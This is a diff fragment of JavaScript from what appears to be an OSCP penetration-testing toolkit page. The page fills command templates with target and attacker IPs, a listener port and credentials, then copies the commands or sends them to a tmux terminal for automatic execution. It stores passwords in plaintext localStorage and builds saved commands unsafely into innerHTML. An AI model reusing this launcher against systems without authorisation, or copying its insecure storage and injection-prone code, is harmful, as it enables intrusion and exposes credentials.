+        document.getElementById('username').value = localStorage.getItem('username') || '';
+        document.getElementById('password').value = localStorage.getItem('password') || '';
+        document.getElementById('terminal-mode-toggle').checked = localStorage.getItem('terminal-mode') === 'true';
+        document.getElementById('auto-execute').checked = localStorage.getItem('auto-execute') !== 'false';
+        updateTerminalModeUI();
+
+        // Save values on change
+        document.querySelectorAll('.config-item input').forEach(input => {
+            input.addEventListener('input', () => {
+                localStorage.setItem(input.id, input.value);
+            });
+        });
+        
+        // Terminal mode toggle
+        document.getElementById('terminal-mode-toggle').addEventListener('change', (e) => {
+            localStorage.setItem('terminal-mode', e.target.checked);
+            updateTerminalModeUI();
+            if (e.target.checked) {
+                checkTerminalStatus();
+            }
+        });
+        
+        document.getElementById('auto-execute').addEventListener('change', (e) => {
+            localStorage.setItem('auto-execute', e.target.checked);
+        });
+        
+        function updateTerminalModeUI() {
+            const isTerminalMode = document.getElementById('terminal-mode-toggle').checked;
+            const box = document.getElementById('terminal-mode-box');
+            const status = document.getElementById('terminal-status');
+            const controls = document.getElementById('terminal-controls');
+            
+            if (isTerminalMode) {
+                box.classList.add('active');
+                status.textContent = 'Checking...';
+                status.className = 'terminal-status';
+                controls.style.display = 'block';
+                checkTerminalStatus();
+            } else {
+                box.classList.remove('active');
+                status.textContent = 'Clipboard mode';
+                status.className = 'terminal-status';
+                controls.style.display = 'none';
+            }
+        }
+        
+        async function checkTerminalStatus() {
+            const status = document.getElementById('terminal-status');
+            const activeInfo = document.getElementById('active-window-info');
+            const spawnBtn = document.getElementById('spawn-btn');
+            
+            try {
+                const response = await fetch(API_BASE + '/status');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.connected) {
+                        status.textContent = '✓ Connected';
+                        status.className = 'terminal-status connected';
+                        activeInfo.textContent = `Active: ${data.session}:${data.window}`;
+                        spawnBtn.textContent = '➕ New Terminal';
+                    } else {
+                        status.textContent = '⚠ No terminal open';
+                        status.className = 'terminal-status error';
+                        activeInfo.textContent = 'Click button to open terminal with tmux';
+                        spawnBtn.textContent = '🖥️ Open Terminal';
+                    }
+                }
+            } catch (e) {
+                status.textContent = '✗ Server not running';
+                status.className = 'terminal-status error';
+                activeInfo.textContent = 'Run ./START in OSCP-Toolkit folder first';
+                spawnBtn.textContent = '🖥️ Open Terminal';
+            }
+        }
+        
+        async function spawnTerminal() {
+            try {
+                await fetch(API_BASE + '/spawn', { method: 'POST' });
+                showToast('Opening terminal...');
+                setTimeout(checkTerminalStatus, 1500);
+            } catch (e) {
+                showToast('Failed to spawn terminal');
+            }
+        }
+        
+        async function sendToTerminal(cmd, execute) {
+            try {
+                const response = await fetch(API_BASE + '/cmd', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cmd, execute })
+                });
+                const data = await response.json();
+                if (data.status === 'ok') {
+                    return data;
+                } else {
+                    showToast(data.message || 'Error');
+                    // Show spawn button if no terminal
+                    if (data.message && data.message.includes('No tmux')) {
+                        document.getElementById('spawn-btn').style.display = 'inline-block';
+                    }
+                    return false;
+                }
+            } catch (e) {
+                showToast('Not connected - run ./START');
+                return false;
+            }
+        }
+
+        async function copyCmd(template) {
+            const ip = document.getElementById('target-ip').value || 'TARGET_IP';
+            const lhost = document.getElementById('attacker-ip').value || 'ATTACKER_IP';
+            const port = document.getElementById('port').value || '4444';
+            const user = document.getElementById('username').value || 'USER';
+            const pass = document.getElementById('password').value || 'PASSWORD';
+
+            let cmd = template
+                .replace(/{IP}/g, ip)
+                .replace(/{LHOST}/g, lhost)
+                .replace(/{PORT}/g, port)
+                .replace(/{USER}/g, user)
+                .replace(/{PASS}/g, pass);
+
+            const isTerminalMode = document.getElementById('terminal-mode-toggle').checked;
+            const autoExecute = document.getElementById('auto-execute').checked;
+            const btn = event.target.closest('.cmd-btn');
+            
+            if (isTerminalMode) {
+                const result = await sendToTerminal(cmd, autoExecute);
+                if (result) {
+                    showToast(`→ ${cmd.substring(0, 35)}...`);
+                    btn.classList.add('sent');
+                    setTimeout(() => btn.classList.remove('sent'), 1000);
+                    document.getElementById('active-window-info').textContent = `→ Sent to: ${result.window}`;
+                }
+            } else {
+                navigator.clipboard.writeText(cmd).then(() => {
+                    showToast('Copied: ' + cmd.substring(0, 40) + (cmd.length > 40 ? '...' : ''));
+                    btn.classList.add('copied');
+                    setTimeout(() => btn.classList.remove('copied'), 1000);
+                });
+            }
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        }
+
+        // Custom commands
+        function loadCustomCmds() {
+            const cmds = JSON.parse(localStorage.getItem('custom-cmds') || '[]');
+            const container = document.getElementById('saved-cmds');
+            container.innerHTML = '';
+            cmds.forEach((cmd, i) => {
+                const tag = document.createElement('div');
+                tag.className = 'saved-cmd-tag';
+                tag.innerHTML = `<span onclick="copyCmd('${cmd.replace(/'/g, "\\'")}')">${cmd.substring(0, 40)}${cmd.length > 40 ? '...' : ''}</span><span class="remove" onclick="removeCustomCmd(${i})">×</span>`;
+                container.appendChild(tag);
+            });
+        }
+
+        function saveCustomCmd() {
+            const input = document.getElementById('custom-cmd-input');
+            if (!input.value.trim()) return;
+            
+            const cmds = JSON.parse(localStorage.getItem('custom-cmds') || '[]');
+            cmds.push(input.value.trim());
+            localStorage.setItem('custom-cmds', JSON.stringify(cmds));
+            input.value = '';
+            loadCustomCmds();
+            showToast('Command saved!');
+        }
+
+        function removeCustomCmd(index) {
+            const cmds = JSON.parse(localStorage.getItem('custom-cmds') || '[]');
+            cmds.splice(index, 1);
+            localStorage.setItem('custom-cmds', JSON.stringify(cmds));
+            loadCustomCmds();
+        }
+
+        document.getElementById('custom-cmd-input').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') saveCustomCmd();
+        });
+
+        loadCustomCmds();
+        
+        // Check status on load if terminal mode enabled
+        if (document.getElementById('terminal-mode-toggle').checked) {
+            checkTerminalStatus();
+        }
+        
+        // Periodically check status when in terminal mode
+        setInterval(() => {
+            if (document.getElementById('terminal-mode-toggle').checked) {
+                checkTerminalStatus();
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
+
